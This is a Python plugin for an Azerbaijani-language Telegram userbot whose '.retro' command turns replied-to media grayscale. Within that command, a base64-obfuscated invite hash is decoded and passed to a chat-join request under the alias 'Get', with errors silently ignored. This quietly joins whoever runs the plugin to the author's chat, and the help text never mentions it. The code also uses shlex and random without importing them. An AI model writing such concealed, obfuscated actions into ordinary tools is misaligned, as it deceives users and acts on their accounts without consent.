# esebj / @esebj      
# Ogurlayan mene ata desin.        
# Ogurlama pesi.                  


import os
import asyncio
import pybase64
import PIL.ImageOps
from PIL import Image
from time import sleep
from telethon import events
from os.path import basename
from typing import Optional, Tuple
from userbot.cmdhelp import CmdHelp
from userbot import bot, LOGS, CMD_HELP
from userbot.events import register as esebj
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

async def grayscale(imagefile, endname):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.grayscale(image)
    inverted_image.save(endname)


def convert_toimage(image):
    img = Image.open(image)
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save("./downloads/temp.jpg", "jpeg")
    os.remove(image)
    return "./downloads/temp.jpg"


async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid
                    )


async def take_screen_shot(
    video_file: str, duration: int, path: str = ""
) -> Optional[str]:
    print(
        "[[[Extracting a frame from %s ||| Video duration => %s]]]",
        video_file,
        duration,
    )
    ttl = duration // 2
    thumb_image_path = path or os.path.join(
        "./downloads/", f"{basename(video_file)}.jpg")
    command = f"ffmpeg -ss {ttl} -i '{video_file}' -vframes 1 '{thumb_image_path}'"
    err = (await runcmd(command))[1]
    if err:
        print(err)
    return thumb_image_path if os.path.exists(thumb_image_path) else None


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        for i in range(number_of_colors)
    ]


        

@esebj(outgoing=True, pattern="^.retro(?: |$)(.*)")
async def retro(esebj):
    reply = await esebj.get_reply_message()
    if not (reply and (reply.media)):
        await esebj.edit("`Zəhmət olmasa medyaya cavab verin.`")
        return
    esebjid = esebj.reply_to_msg_id
    if not os.path.isdir("./downloads/"):
        os.mkdir("./downloads/")
    await esebj.edit("`Effekt hazırlanır...`")
    
    await asyncio.sleep(2)
    esebjsticker = await reply.download_media(file="./downloads/")
    if not esebjsticker.endswith(
            (".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(esebjsticker)
        await esebj.edit("**Bu media növü təsdiq olunmur...**\n**Təsdiqlənən medya növləri:** `jpg, png, sticker`")
        return

    jisanidea = None
    if esebjsticker.endswith(".tgs"):
        await esebj.edit(
            "**Effekt hazırlandı.**"
        )
        esebjfile = os.path.join("./downloads/", "NΣON.png")
        esebjcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {esebjsticker} {esebjfile}"
        )
        stdout, stderr = (await runcmd(esebjcmd))[:2]
        if not os.path.lexists(esebjfile):
            await esebj.edit("`Xəta baş verdi...`") 
            LOGS.info(stdout + stderr)
        meme_file = esebjfile
        jisanidea = True
    elif esebjsticker.endswith(".webp"):
        await esebj.edit(
            "**Effekt hazırlandı.**"
        )
        esebjfile = os.path.join("./downloads/", "memes.jpg")
        os.rename(esebjsticker, esebjfile)
        if not os.path.lexists(esebjfile):
            await esebj.edit("**X Ə T A**")
            return
        meme_file = esebjfile
        jisanidea = True
    elif esebjsticker.endswith((".mp4", ".mov")):
        await esebj.edit(
            "**Effekt hazırlandı.**"
        )
        esebjfile = os.path.join("./downloads/", "memes.jpg")
        await take_screen_shot(esebjsticker, 0, esebjfile)
        if not os.path.lexists(esebjfile):
            await esebj.edit("**X Ə T A**")
            return
        meme_file = esebjfile
        jisanidea = True
    else:
        await esebj.edit(
            "**Effekt hazırlandı.**"
        )
        meme_file = esebjsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await esebj.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "NΣON.webp" if jisanidea else "NΣON.jpg"
    await grayscale(meme_file, outputfile)
    await esebj.client.send_file(
        esebj.chat_id, outputfile,
        force_document=False,
        reply_to=esebjid,
        caption=f"[N Σ O N](t.me/esebj)"
        )
    await esebj.delete()
    os.remove(outputfile)
    for files in (
        esebjsticker,
        meme_file):
        if files and os.path.exists(files):
            os.remove(files)


Help = CmdHelp('effect').add_command(
    'retro', None,'Şəkili ağ-qara edər.'
).add_info(
    '**@esebj tərəfindən @NeonUserBot üçün hazırlandı.**'
).add()

